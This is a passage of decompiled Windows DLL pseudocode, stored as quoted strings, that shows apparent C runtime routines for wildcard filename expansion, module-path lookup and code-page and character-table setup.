    "  if ( *(_BYTE *)(a2 + 40) )",
    "  {",
    "    sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "    *(_BYTE *)(a2 + 40) = 0;",
    "  }",
    "  v7 = sub_180024B50(1u);",
    "  *(_QWORD *)(a2 + 16) = v7;",
    "  result = v7 == 0 ? 0xC : 0;",
    "  *(_BYTE *)(a2 + 40) = (_DWORD)result == 0;",
    "  *(_QWORD *)(a2 + 24) = (_DWORD)result == 0;",
    "  if ( !(_DWORD)result )",
    "  {",
    "LABEL_11:",
    "    **(_BYTE **)(a2 + 16) = 0;",
    "LABEL_5:",
    "    *(_QWORD *)(a2 + 32) = 0;",
    "    return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002C750(__int64 *a1, __int64 *a2)",
    "{",
    "  __int64 *v3; // rbx",
    "  __int64 v5; // rax",
    "  __int64 v6; // rax",
    "  __int64 v7; // rcx",
    "  __int128 v8; // rdi",
    "  XSAVE_FORMAT **j; // rbx",
    "  XSAVE_FORMAT **i; // rbx",
    "  unsigned __int64 v11; // rdx",
    "  _QWORD *v12; // rax",
    "  __int64 v13; // r14",
    "  __int64 v14; // rcx",
    "  __int64 v15; // rax",
    "  __int64 v16; // rbx",
    "  XSAVE_FORMAT **k; // rbx",
    "  __int64 v18; // rcx",
    "  __int64 *v19; // r14",
    "  __int64 v20; // r12",
    "  __int64 v21; // r8",
    "  __int64 v22; // r15",
    "  __int64 v23; // r15",
    "  XSAVE_FORMAT **m; // rbx",
    "  __int128 lpMem; // [rsp+30h] [rbp-20h] BYREF",
    "  __int64 v26; // [rsp+40h] [rbp-10h]",
    "  __int64 v27; // [rsp+98h] [rbp+48h] BYREF",
    "  unsigned __int64 v28; // [rsp+A0h] [rbp+50h]",
    "  __int64 v29; // [rsp+A8h] [rbp+58h]",
    "",
    "  v3 = a1;",
    "  if ( a2 )",
    "  {",
    "    *a2 = 0;",
    "    v5 = *a1;",
    "    lpMem = 0;",
    "    v26 = 0;",
    "    while ( v5 )",
    "    {",
    "      strcpy((char *)&v27, \"*?\");",
    "      v6 = sub_180034090(v5, &v27);",
    "      v7 = *v3;",
    "      if ( v6 )",
    "      {",
    "        DWORD2(v8) = sub_18002CB18(v7, v6, &lpMem);",
    "        if ( DWORD2(v8) )",
    "        {",
    "          *(_QWORD *)&v8 = lpMem;",
    "          for ( i = (XSAVE_FORMAT **)lpMem; i != *((XSAVE_FORMAT ***)&lpMem + 1); ++i )",
    "            sub_180023374(*i);",
    "          goto LABEL_24;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        DWORD2(v8) = sub_18002C994(v7, 0, 0, &lpMem);",
    "        if ( DWORD2(v8) )",
    "        {",
    "          *(_QWORD *)&v8 = lpMem;",
    "          for ( j = (XSAVE_FORMAT **)lpMem; j != *((XSAVE_FORMAT ***)&lpMem + 1); ++j )",
    "            sub_180023374(*j);",
    "LABEL_24:",
    "          sub_180023374((XSAVE_FORMAT *)v8);",
    "          return DWORD2(v8);",
    "        }",
    "      }",
    "      v5 = *++v3;",
    "    }",
    "    v8 = lpMem;",
    "    v11 = 0;",
    "    v28 = 0;",
    "    v12 = (_QWORD *)lpMem;",
    "    v13 = ((__int64)(*((_QWORD *)&lpMem + 1) - lpMem) >> 3) + 1;",
    "    if ( (_QWORD)lpMem != *((_QWORD *)&lpMem + 1) )",
    "    {",
    "      do",
    "      {",
    "        v14 = -1;",
    "        do",
    "          ++v14;",
    "        while ( *(_BYTE *)(*v12 + v14) );",
    "        ++v12;",
    "        v11 += v14 + 1;",
    "      }",
    "      while ( v12 != *((_QWORD **)&lpMem + 1) );",
    "      v28 = v11;",
    "    }",
    "    v15 = sub_18002270C(((__int64)(*((_QWORD *)&lpMem + 1) - lpMem) >> 3) + 1, v11, 1u);",
    "    v16 = v15;",
    "    if ( !v15 )",
    "    {",
    "      sub_180023374(0);",
    "      for ( k = (XSAVE_FORMAT **)v8; k != *((XSAVE_FORMAT ***)&v8 + 1); ++k )",
    "        sub_180023374(*k);",
    "      DWORD2(v8) = -1;",
    "      goto LABEL_24;",
    "    }",
    "    v18 = v15 + 8 * v13;",
    "    v19 = (__int64 *)v8;",
    "    v29 = v18;",
    "    v20 = v18;",
    "    if ( (_QWORD)v8 != *((_QWORD *)&v8 + 1) )",
    "    {",
    "      v27 = v15 - v8;",
    "      do",
    "      {",
    "        v21 = *v19;",
    "        v22 = -1;",
    "        do",
    "          ++v22;",
    "        while ( *(_BYTE *)(v21 + v22) );",
    "        v23 = v22 + 1;",
    "        if ( (unsigned int)sub_180032B70(v20, v28 + v18 - v20, v21, v23) )",
    "        {",
    "          sub_18001A6B4();",
    "          JUMPOUT(0x18002C990LL);",
    "        }",
    "        v18 = v29;",
    "        *(__int64 *)((char *)v19 + v27) = v20;",
    "        v20 += v23;",
    "        ++v19;",
    "      }",
    "      while ( v19 != *((__int64 **)&v8 + 1) );",
    "    }",
    "    *a2 = v16;",
    "    sub_180023374(0);",
    "    for ( m = (XSAVE_FORMAT **)v8; m != *((XSAVE_FORMAT ***)&v8 + 1); ++m )",
    "      sub_180023374(*m);",
    "    sub_180023374((XSAVE_FORMAT *)v8);",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002C994(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)",
    "{",
    "  __int64 v4; // rbp",
    "  unsigned int v6; // edi",
    "  unsigned __int64 v10; // rbp",
    "  unsigned __int64 v12; // r15",
    "  XSAVE_FORMAT *v13; // rax",
    "  XSAVE_FORMAT *v14; // rbx",
    "  __int64 v15; // r14",
    "  __int64 v16; // rax",
    "  unsigned __int64 v17; // r14",
    "  __int64 v18; // rax",
    "",
    "  v4 = -1;",
    "  v6 = 0;",
    "  do",
    "    ++v4;",
    "  while ( *(_BYTE *)(a1 + v4) );",
    "  v10 = v4 + 1;",
    "  if ( v10 > ~a3 )",
    "    return 12;",
    "  v12 = v10 + a3 + 1;",
    "  v13 = (XSAVE_FORMAT *)sub_1800232FC(v12, 1u);",
    "  v14 = v13;",
    "  if ( a3 && (unsigned int)sub_180032B70(v13, v12, a2, a3)",
    "    || (unsigned int)sub_180032B70((char *)v14 + a3, v12 - a3, a1, v10) )",
    "  {",
    "    sub_18001A6B4();",
    "    __debugbreak();",
    "  }",
    "  v15 = a4[2];",
    "  if ( a4[1] != v15 )",
    "    goto LABEL_17;",
    "  if ( *a4 )",
    "  {",
    "    v17 = (v15 - *a4) >> 3;",
    "    if ( v17 <= 0x7FFFFFFFFFFFFFFFLL )",
    "    {",
    "      v18 = sub_18002DC88(*a4, 2 * v17, 8);",
    "      if ( v18 )",
    "      {",
    "        *a4 = v18;",
    "        a4[1] = v18 + 8 * v17;",
    "        a4[2] = v18 + 16 * v17;",
    "        sub_180023374(0);",
    "        goto LABEL_17;",
    "      }",
    "      sub_180023374(0);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *a4 = sub_1800232FC(4u, 8u);",
    "    sub_180023374(0);",
    "    v16 = *a4;",
    "    if ( *a4 )",
    "    {",
    "      a4[1] = v16;",
    "      a4[2] = v16 + 32;",
    "LABEL_17:",
    "      *(_QWORD *)a4[1] = v14;",
    "      a4[1] += 8LL;",
    "      goto LABEL_18;",
    "    }",
    "  }",
    "  v6 = 12;",
    "  sub_180023374(v14);",
    "LABEL_18:",
    "  sub_180023374(0);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002CB18(_BYTE *a1, _BYTE *a2, _QWORD *a3)",
    "{",
    "  __int64 i; // rbx",
    "  unsigned __int8 v6; // al",
    "  unsigned __int8 v8; // r8",
    "  char v9; // al",
    "  __int64 v10; // r13",
    "  unsigned int v11; // r9d",
    "  int v12; // eax",
    "  XSAVE_FORMAT *v13; // rcx",
    "  HANDLE FirstFile; // rbx",
    "  unsigned int v15; // ebx",
    "  __int64 v16; // rsi",
    "  UINT v17; // r9d",
    "  int v18; // eax",
    "  XSAVE_FORMAT *v19; // r14",
    "  XSAVE_FORMAT *v20; // rcx",
    "  char ControlWord_high; // al",
    "  unsigned int v22; // r13d",
    "  __int64 v23; // rdx",
    "  _BYTE v24[8]; // [rsp+30h] [rbp-D0h] BYREF",
    "  __int64 v25; // [rsp+38h] [rbp-C8h]",
    "  _QWORD v26[2]; // [rsp+40h] [rbp-C0h] BYREF",
    "  XSAVE_FORMAT *lpMem; // [rsp+50h] [rbp-B0h]",
    "  __int64 v28; // [rsp+58h] [rbp-A8h]",
    "  __int64 v29; // [rsp+60h] [rbp-A0h]",
    "  char v30; // [rsp+68h] [rbp-98h]",
    "  _QWORD v31[3]; // [rsp+70h] [rbp-90h] BYREF",
    "  char v32; // [rsp+88h] [rbp-78h]",
    "  _QWORD v33[3]; // [rsp+90h] [rbp-70h] BYREF",
    "  char v34; // [rsp+A8h] [rbp-58h]",
    "  _QWORD v35[2]; // [rsp+B0h] [rbp-50h] BYREF",
    "  XSAVE_FORMAT *v36; // [rsp+C0h] [rbp-40h]",
    "  __int64 v37; // [rsp+C8h] [rbp-38h]",
    "  __int64 v38; // [rsp+D0h] [rbp-30h]",
    "  char v39; // [rsp+D8h] [rbp-28h]",
    "  struct _WIN32_FIND_DATAW FindFileData; // [rsp+E0h] [rbp-20h] BYREF",
    "",
    "  for ( i = 0x200000000801LL; a2 != a1; a2 = (_BYTE *)sub_180034458(a1) )",
    "  {",
    "    v6 = *a2 - 47;",
    "    if ( v6 <= 0x2Du && _bittest64(&i, (char)v6) )",
    "      break;",
    "  }",
    "  if ( *a2 == 58 && a2 != a1 + 1 )",
    "    return sub_18002C994((__int64)a1, 0, 0, a3);",
    "  v8 = *a2 - 47;",
    "  if ( v8 > 0x2Du || (v9 = 1, !_bittest64(&i, (char)v8)) )",
    "    v9 = 0;",
    "  v26[0] = 0;",
    "  v26[1] = 0;",
    "  lpMem = 0;",
    "  v28 = 0;",
    "  v29 = 0;",
    "  v10 = (a2 - a1 + 1) & -(__int64)(v9 != 0);",
    "  v30 = 0;",
    "  v25 = v10;",
    "  sub_18001B674(v31, 0);",
    "  if ( *(_DWORD *)(v31[1] + 12LL) == 65001 )",
    "  {",
    "    if ( v32 )",
    "      *(_DWORD *)(v31[0] + 936LL) &= ~2u;",
    "    v11 = 65001;",
    "  }",
    "  else if ( (unsigned int)sub_180023678() )",
    "  {",
    "    if ( v32 )",
    "      *(_DWORD *)(v31[0] + 936LL) &= ~2u;",
    "    v11 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( v32 )",
    "      *(_DWORD *)(v31[0] + 936LL) &= ~2u;",
    "    v11 = 1;",
    "  }",
    "  v12 = sub_180021A20(a1, (__int64)v26, (__int64)v24, v11);",
    "  v13 = lpMem;",
    "  if ( v12 )",
    "    v13 = 0;",
    "  FirstFile = FindFirstFileExW(&v13->ControlWord, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 0);",
    "  if ( FirstFile == (HANDLE)-1LL )",
    "  {",
    "    v15 = sub_18002C994((__int64)a1, 0, 0, a3);",
    "    if ( v30 )",
    "      sub_180023374(lpMem);",
    "    return v15;",
    "  }",
    "  v16 = (__int64)(a3[1] - *a3) >> 3;",
    "  while ( 1 )",
    "  {",
    "    v35[0] = 0;",
    "    v35[1] = 0;",
    "    v36 = 0;",
    "    v37 = 0;",
    "    v38 = 0;",
    "    v39 = 0;",
    "    sub_18001B674(v33, 0);",
    "    if ( *(_DWORD *)(v33[1] + 12LL) == 65001 )",
    "    {",
    "      if ( v34 )",
    "        *(_DWORD *)(v33[0] + 936LL) &= ~2u;",
    "      v17 = 65001;",
    "    }",
    "    else if ( (unsigned int)sub_180023678() )",
    "    {",
    "      if ( v34 )",
    "        *(_DWORD *)(v33[0] + 936LL) &= ~2u;",
    "      v17 = 0;",
    "    }",
    "    else",
    "    {",
    "      if ( v34 )",
    "        *(_DWORD *)(v33[0] + 936LL) &= ~2u;",
    "      v17 = 1;",
    "    }",
    "    v18 = sub_18002C5C4(FindFileData.cFileName, (__int64)v35, (__int64)v24, v17);",
    "    v19 = v36;",
    "    v20 = v36;",
    "    if ( v18 )",
    "      v20 = 0;",
    "    if ( LOBYTE(v20->ControlWord) == 46 )",
    "    {",
    "      ControlWord_high = HIBYTE(v20->ControlWord);",
    "      if ( !ControlWord_high || ControlWord_high == 46 && !LOBYTE(v20->StatusWord) )",
    "      {",
    "        if ( v39 )",
    "          sub_180023374(v36);",
    "        goto LABEL_52;",
    "      }",
    "    }",
    "    v22 = sub_18002C994((__int64)v20, (__int64)a1, v10, a3);",
    "    if ( v22 )",
    "      break;",
    "    if ( v39 )",
    "      sub_180023374(v19);",
    "    v10 = v25;",
    "LABEL_52:",
    "    if ( !FindNextFileW(FirstFile, &FindFileData) )",
    "    {",
    "      v23 = (__int64)(a3[1] - *a3) >> 3;",
    "      if ( v16 != v23 )",
    "        sub_180033BE0(*a3 + 8 * v16, v23 - v16, 8, sub_18002C5B0);",
    "      FindClose(FirstFile);",
    "      if ( v30 )",
    "        sub_180023374(lpMem);",
    "      return 0;",
    "    }",
    "  }",
    "  if ( v39 )",
    "    sub_180023374(v19);",
    "  FindClose(FirstFile);",
    "  if ( v30 )",
    "    sub_180023374(lpMem);",
    "  return v22;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_18002CE68(__int64 *a1, __int64 *a2)",
    "{",
    "}__int64 __fastcall sub_18002CE70(HMODULE a1, __int64 a2, unsigned int a3)",
    "{",
    "  __int64 v3; // rdi",
    "  DWORD LastError; // eax",
    "  int v7; // r9d",
    "  _BYTE v8[8]; // [rsp+20h] [rbp-E0h] BYREF",
    "  _QWORD v9[3]; // [rsp+28h] [rbp-D8h] BYREF",
    "  char v10; // [rsp+40h] [rbp-C0h]",
    "  _QWORD v11[4]; // [rsp+48h] [rbp-B8h] BYREF",
    "  __int64 v12; // [rsp+68h] [rbp-98h]",
    "  char v13; // [rsp+70h] [rbp-90h]",
    "  _CONTEXT::$D2ECA93702C646ACAFACD524BE9E8FEB Filename; // [rsp+80h] [rbp-80h] BYREF",
    "",
    "  v3 = a3;",
    "  if ( GetModuleFileNameW(a1, &Filename.FltSave.ControlWord, 0x105u) )",
    "  {",
    "    v12 = 0;",
    "    v11[0] = a2;",
    "    v11[1] = v3;",
    "    v11[3] = v3;",
    "    v11[2] = a2;",
    "    v13 = 0;",
    "    sub_18001B674(v9, 0);",
    "    v7 = 65001;",
    "    if ( *(_DWORD *)(v9[1] + 12LL) == 65001 )",
    "    {",
    "      if ( v10 )",
    "        *(_DWORD *)(v9[0] + 936LL) &= ~2u;",
    "    }",
    "    else if ( (unsigned int)sub_180023678() )",
    "    {",
    "      if ( v10 )",
    "        *(_DWORD *)(v9[0] + 936LL) &= ~2u;",
    "      v7 = 0;",
    "    }",
    "    else",
    "    {",
    "      if ( v10 )",
    "        *(_DWORD *)(v9[0] + 936LL) &= ~2u;",
    "      v7 = 1;",
    "    }",
    "    sub_180021B9C(&Filename, (__int64)v11, (__int64)v8, v7);",
    "    return (unsigned int)v12;",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "    sub_18001A780(LastError);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_18002CF94(__int64 a1, int *a2, volatile signed __int32 ****a3, int *a4)",
    "{",
    "  _OWORD *v6; // rax",
    "  _OWORD *v7; // rcx",
    "  __int64 v8; // r8",
    "  __int64 v9; // r9",
    "  _OWORD *v10; // rax",
    "  _OWORD *v11; // rcx",
    "  XSAVE_FORMAT **v12; // rcx",
    "",
    "  sub_1800209E8(*a2);",
    "  v6 = (**a3)[17] + 6;",
    "  v7 = (_OWORD *)qword_18004DDB0;",
    "  if ( !qword_18004DDB0 )",
    "    goto LABEL_7;",
    "  if ( (**a3)[17] == (volatile signed __int32 *)-24LL )",
    "  {",
    "    sub_1800368A0(qword_18004DDB0, 0, 257);",
    "LABEL_7:",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    v8 = 2;",
    "    goto LABEL_8;",
    "  }",
    "  v8 = 2;",
    "  v9 = 2;",
    "  do",
    "  {",
    "    *v7 = *v6;",
    "    v7[1] = v6[1];",
    "    v7[2] = v6[2];",
    "    v7[3] = v6[3];",
    "    v7[4] = v6[4];",
    "    v7[5] = v6[5];",
    "    v7[6] = v6[6];",
    "    v7 += 8;",
    "    *(v7 - 1) = v6[7];",
    "    v6 += 8;",
    "    --v9;",
    "  }",
    "  while ( v9 );",
    "  *(_BYTE *)v7 = *(_BYTE *)v6;",
    "LABEL_8:",
    "  v10 = (_OWORD *)((char *)(**a3)[17] + 281);",
    "  v11 = (_OWORD *)qword_18004DDB8;",
    "  if ( !qword_18004DDB8 )",
    "  {",
    "LABEL_13:",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    goto LABEL_14;",
    "  }",
    "  if ( (**a3)[17] == (volatile signed __int32 *)-281LL )",
    "  {",
    "    sub_1800368A0(qword_18004DDB8, 0, 256);",
    "    goto LABEL_13;",
    "  }",
    "  do",
    "  {",
    "    *v11 = *v10;",
    "    v11[1] = v10[1];",
    "    v11[2] = v10[2];",
    "    v11[3] = v10[3];",
    "    v11[4] = v10[4];",
    "    v11[5] = v10[5];",
    "    v11[6] = v10[6];",
    "    v11 += 8;",
    "    *(v11 - 1) = v10[7];",
    "    v10 += 8;",
    "    --v8;",
    "  }",
    "  while ( v8 );",
    "LABEL_14:",
    "  if ( _InterlockedExchangeAdd(**a3[1], 0xFFFFFFFF) == 1 )",
    "  {",
    "    v12 = (XSAVE_FORMAT **)*a3[1];",
    "    if ( *v12 != (XSAVE_FORMAT *)&unk_18004B760 )",
    "      sub_180023374(*v12);",
    "  }",
    "  **a3[1] = (**a3)[17];",
    "  _InterlockedIncrement((**a3)[17]);",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002D164(UINT a1)",
    "{",
    "  UINT OEMCP; // eax",
    "  _QWORD v4[3]; // [rsp+20h] [rbp-28h] BYREF",
    "  char v5; // [rsp+38h] [rbp-10h]",
    "",
    "  sub_18001B674(v4, 0);",
    "  dword_18004DDC8 = 0;",
    "  switch ( a1 )",
    "  {",
    "    case 0xFFFFFFFE:",
    "      dword_18004DDC8 = 1;",
    "      OEMCP = GetOEMCP();",
    "LABEL_5:",
    "      a1 = OEMCP;",
    "      break;",
    "    case 0xFFFFFFFD:",
    "      dword_18004DDC8 = 1;",
    "      OEMCP = GetACP();",
    "      goto LABEL_5;",
    "    case 0xFFFFFFFC:",
    "      dword_18004DDC8 = 1;",
    "      a1 = *(_DWORD *)(v4[1] + 12LL);",
    "      break;",
    "  }",
    "  if ( v5 )",
    "    *(_DWORD *)(v4[0] + 936LL) &= ~2u;",
    "  return a1;",
    "}",
    "",
    "",
    "char __fastcall sub_18002D1E4(__int64 a1)",
    "{",
    "  __int64 v2; // rdx",
    "  _WORD *v3; // rdi",
    "  __int64 i; // rcx",
    "  __int64 j; // rdi",
    "  char *v6; // rcx",
    "  __int64 v7; // rbx",
    "  char *v8; // rcx",
    "  char result; // al",
    "",
    "  sub_1800368A0(a1 + 24, 0, 257);",
    "  v2 = 0;",
    "  v3 = (_WORD *)(a1 + 12);",
    "  *(_QWORD *)(a1 + 4) = 0;",
    "  *(_QWORD *)(a1 + 544) = 0;",
    "  for ( i = 6; i; --i )",
    "    *v3++ = 0;",
    "  for ( j = 0; j < 257; ++j )",
    "  {",
    "    v6 = (char *)&unk_18004B760 + j;",
    "    v6[a1 - (_QWORD)&unk_18004B778 + 48] = v6[24];",
    "  }",
    "  v7 = a1 - (_QWORD)&unk_18004B879;",
    "  do",
    "  {",
    "    v8 = (char *)&unk_18004B760 + v2++;",
    "    result = v8[281];",
    "    v8[v7 + 562] = result;",
    "  }",
    "  while ( v2 < 256 );",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_18002D27C(__int64 a1)",
    "{",
    "  UINT v2; // ecx",
    "  unsigned int v3; // eax",
    "  _BYTE *v4; // rcx",
    "  __int64 v5; // rbx",
    "  unsigned __int8 v6; // al",
    "  unsigned __int8 *v7; // rdx",
    "  unsigned int v8; // r8d",
    "  __int64 i; // rcx",
    "  WORD *v10; // rdx",
    "  _BYTE *v11; // rax",
    "  char v12; // cl",
    "  unsigned int v13; // edx",
    "  _BYTE *v14; // rcx",
    "  _BYTE CPInfo[32]; // [rsp+50h] [rbp-B0h] BYREF",
    "  _BYTE v17[256]; // [rsp+70h] [rbp-90h] BYREF",
    "  WCHAR v18[128]; // [rsp+170h] [rbp+70h] BYREF",
    "  WCHAR v19[128]; // [rsp+270h] [rbp+170h] BYREF",
    "  WORD v20[512]; // [rsp+370h] [rbp+270h] BYREF",
    "",
    "  v2 = *(_DWORD *)(a1 + 4);",
    "  if ( v2 == 65001 || !GetCPInfo(v2, (LPCPINFO)CPInfo) )",
    "  {",
    "    v13 = 0;",
    "    v14 = (_BYTE *)(a1 + 25);",
    "    do",
    "    {",
    "      if ( v13 - 97 + 32 > 0x19 )",
    "      {",
    "        if ( v13 - 97 > 0x19 )",
    "        {",
    "          LOBYTE(v11) = 0;",
    "        }",
    "        else",
    "        {",
    "          *v14 |= 0x20u;",
    "          LOBYTE(v11) = v13 - 32;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        *v14 |= 0x10u;",
    "        LOBYTE(v11) = v13 + 32;",
    "      }",
    "      v14[256] = (_BYTE)v11;",
    "      ++v13;",
    "      ++v14;",
    "    }",
    "    while ( v13 < 0x100 );",
    "  }",
    "  else",
    "  {",
    "    v3 = 0;",
    "    v4 = v17;",
    "    v5 = 256;",
    "    do",
    "      *v4++ = v3++;",
    "    while ( v3 < 0x100 );",
    "    v6 = CPInfo[6];",
    "    v7 = &CPInfo[6];",
    "    v17[0] = 32;",
    "    while ( v6 )",
    "    {",
    "      v8 = v7[1];",
    "      for ( i = v6; (unsigned int)i <= v8 && (unsigned int)i < 0x100; i = (unsigned int)(i + 1) )",
    "        v17[i] = 32;",
    "      v7 += 2;",
    "      v6 = *v7;",
    "    }",
    "    sub_18002B51C(0, 1u, (__int64)v17, 256, v20, *(_DWORD *)(a1 + 4), 0);",
    "    sub_18002B9E0(0, *(_QWORD *)(a1 + 544), 0x100u, v17, 256, v18, 256, *(_DWORD *)(a1 + 4), 0);",
    "    sub_18002B9E0(0, *(_QWORD *)(a1 + 544), 0x200u, v17, 256, v19, 256, *(_DWORD *)(a1 + 4), 0);",
    "    v10 = v20;",
    "    v11 = (_BYTE *)(a1 + 25);",
    "    do",
    "    {",
    "      if ( (*(_BYTE *)v10 & 1) != 0 )",
    "      {",
    "        *v11 |= 0x10u;",
    "        v12 = v11[(_QWORD)v18 - a1 - 25];",
    "      }",
    "      else if ( (*(_BYTE *)v10 & 2) != 0 )",
    "      {",
    "        *v11 |= 0x20u;",
    "        v12 = v11[(_QWORD)v19 - a1 - 25];",
    "      }",
    "      else",
    "      {",
    "        v12 = 0;",
    "      }",
    "      v11[256] = v12;",
    "      ++v10;",
    "      ++v11;",
    "      --v5;",
    "    }",
    "    while ( v5 );",
    "  }",
    "  return (char)v11;",
    "}",
    "",
    "",
    "__int64 sub_18002D464(UINT a1, char a2, ...)",
    "{",
    "  unsigned int v4; // edi",
    "  XSAVE_FORMAT *v6; // rbx",
    "  _OWORD *v7; // rcx",
    "  __int64 v8; // rdx",
    "  __int64 v9; // r8",
    "  _OWORD *v10; // rax",
    "  __int128 v11; // xmm1",
    "  __int128 v12; // xmm0",
    "  __int128 v13; // xmm1",
    "  __int128 v14; // xmm0",
    "  __int128 v15; // xmm1",
    "  __int128 v16; // xmm0",
    "  __int128 v17; // xmm1",
    "  __int128 v18; // xmm0",
    "  __int128 v19; // xmm1",
    "  __int64 v20; // rax",
    "  XSAVE_FORMAT *v21; // rcx",
    "  _OWORD *v22; // rax",
    "  __int128 v23; // xmm1",
    "  M128A v24; // xmm0",
    "  M128A v25; // xmm1",
    "  M128A v26; // xmm0",
    "  M128A v27; // xmm1",
    "  M128A v28; // xmm0",
    "  __int128 v29; // xmm1",
    "  __int128 v30; // xmm0",
    "  __int128 v31; // xmm1",
    "  ULONGLONG v32; // rax",
    "  unsigned int v33; // esi",
    "  XSAVE_FORMAT *v34; // rcx",
    "  int v35; // [rsp+28h] [rbp-E0h] BYREF",
    "  int v36; // [rsp+2Ch] [rbp-DCh] BYREF",
    "  __int64 v37; // [rsp+30h] [rbp-D8h] BYREF",
    "  volatile signed __int32 ***v38[2]; // [rsp+38h] [rbp-D0h] BYREF",
    "  _BYTE v39[560]; // [rsp+48h] [rbp-C0h] BYREF",
    "  __int64 v40; // [rsp+2A8h] [rbp+1A0h] BYREF",
    "  va_list va; // [rsp+2A8h] [rbp+1A0h]",
    "  void **v42; // [rsp+2B0h] [rbp+1A8h] BYREF",
    "  va_list va1; // [rsp+2B0h] [rbp+1A8h]",
    "  va_list va2; // [rsp+2B8h] [rbp+1B0h] BYREF",
    "",
    "  va_start(va2, a2);",
    "  va_start(va1, a2);",
    "  va_start(va, a2);",
    "  v40 = va_arg(va1, _QWORD);",
    "  va_copy(va2, va1);",
    "  v42 = va_arg(va2, void **);",
    "  sub_18002D6D4(v40, v42);",
    "  v4 = sub_18002D164(a1);",
    "  if ( v4 == *(_DWORD *)(*(_QWORD *)(v40 + 136) + 4LL) )",
    "    return 0;",
    "  v6 = (XSAVE_FORMAT *)sub_180024B50(0x228u);",
    "  if ( v6 )",
    "  {",
    "    v7 = v39;",
    "    v8 = 4;",
    "    v9 = 4;",
    "    v10 = *(_OWORD **)(v40 + 136);",
    "    do",
    "    {",
    "      v11 = v10[1];",
    "      *v7 = *v10;",
    "      v12 = v10[2];",
    "      v7[1] = v11;",
    "      v13 = v10[3];",
    "      v7[2] = v12;",
    "      v14 = v10[4];",
    "      v7[3] = v13;",
    "      v15 = v10[5];",
    "      v7[4] = v14;",
    "      v16 = v10[6];",
    "      v7[5] = v15;",
    "      v17 = v10[7];",
    "      v10 += 8;",
    "      v7[6] = v16;",
    "      v7 += 8;",
    "      *(v7 - 1) = v17;",
    "      --v9;",
    "    }",
    "    while ( v9 );",
    "    v18 = *v10;",
    "    v19 = v10[1];",
    "    v20 = *((_QWORD *)v10 + 4);",
    "    *v7 = v18;",
    "    v7[1] = v19;",
    "    *((_QWORD *)v7 + 4) = v20;",
    "    v21 = v6;",
    "    v22 = v39;",
    "    do",
    "    {",
    "      v23 = v22[1];",
    "      *(_OWORD *)&v21->ControlWord = *v22;",
    "      v24 = (M128A)v22[2];",
    "      *(_OWORD *)&v21->DataOffset = v23;",
    "      v25 = (M128A)v22[3];",
    "      v21->FloatRegisters[0] = v24;",
    "      v26 = (M128A)v22[4];",
    "      v21->FloatRegisters[1] = v25;",
    "      v27 = (M128A)v22[5];",
    "      v21->FloatRegisters[2] = v26;",
    "      v28 = (M128A)v22[6];",
    "      v21->FloatRegisters[3] = v27;",
    "      v29 = v22[7];",
    "      v22 += 8;",
    "      v21->FloatRegisters[4] = v28;",
    "      v21 = (XSAVE_FORMAT *)((char *)v21 + 128);",
    "      *(_OWORD *)&v21[-1].Reserved4[80] = v29;",
    "      --v8;",
    "    }",
    "    while ( v8 );",
    "    v30 = *v22;",
    "    v31 = v22[1];",
    "    v32 = *((_QWORD *)v22 + 4);",
    "    *(_OWORD *)&v21->ControlWord = v30;",
    "    *(_OWORD *)&v21->DataOffset = v31;",
    "    v21->FloatRegisters[0].Low = v32;",
    "    *(_DWORD *)&v6->ControlWord = 0;",
    "    v33 = sub_18002D808(v4, v6, 0, 128);",
    "    if ( v33 == -1 )",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      sub_180023374(v6);",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "    else",
    "    {",
    "      if ( !a2 )",
    "        unknown_libname_4();",
    "      if ( _InterlockedExchangeAdd(*(volatile signed __int32 **)(v40 + 136), 0xFFFFFFFF) == 1 )",
    "      {",
    "        v34 = *(XSAVE_FORMAT **)(v40 + 136);",
    "        if ( v34 != (XSAVE_FORMAT *)&unk_18004B760 )",
    "          sub_180023374(v34);",
    "      }",
    "      *(_DWORD *)&v6->ControlWord = 1;",
    "      *(_QWORD *)(v40 + 136) = v6;",
    "      if ( (*(_DWORD *)(v40 + 936) & dword_18004B5B0) == 0 )",
    "      {",
    "        va_copy((va_list)v38, va);",
    "        va_copy((va_list)&v38[1], va1);",
    "        v36 = 5;",
    "        LODWORD(v37) = 5;",
    "        sub_18002CF94((__int64)&v35, (int *)&v37, v38, &v36);",
    "        if ( a2 )",
    "          off_18004B4A0 = *v42;",
    "      }",
    "      sub_180023374(0);",
    "      return v33;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    sub_180023374(0);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "XSAVE_FORMAT *__fastcall sub_18002D6D4(__int64 a1, volatile signed __int32 **a2)",
    "{",
    "  XSAVE_FORMAT *v4; // rbx",
    "  volatile signed __int32 *v5; // rax",
    "",
    "  if ( (dword_18004B5B0 & *(_DWORD *)(a1 + 936)) != 0 && *(_QWORD *)(a1 + 144) )",
    "  {",
    "    v4 = *(XSAVE_FORMAT **)(a1 + 136);",
    "  }",
    "  else",
    "  {",
    "    sub_1800209E8(5);",
    "    v4 = *(XSAVE_FORMAT **)(a1 + 136);",
    "    if ( v4 != (XSAVE_FORMAT *)*a2 )",
    "    {",
    "      if ( v4",
